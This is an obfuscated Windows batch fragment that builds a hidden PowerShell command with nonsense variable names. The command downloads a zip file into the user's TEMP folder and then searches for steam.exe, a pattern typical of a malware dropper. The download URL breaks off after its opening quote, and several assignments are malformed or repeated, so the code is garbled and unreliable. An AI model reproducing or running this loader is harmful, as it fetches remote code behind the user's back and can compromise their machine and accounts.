set aabb2233z....xyz1234z....xyz9876z=powershell -w h -noni -nop -c "$u='
set aaa987z....yzx123z....xyzyx=z=$env:TEMP+'\8fVK.zip';
set zxyzy1234z....yzxyzz12z=$env:TEMP+'\e';
set yxyxyzz....12345z=iwr $u -o $aaa987z....yzx123z....xyzyx;
set zzxyz987z....xyxyzzzz=iwr $u -o $aaa987z....yzx123z....xyzyx;
set yzxyzyz....xyyzzyz=(gci $zxyzy1234z....yzxyzz12z -r -fi steam.exe|select -f 1).FullName;
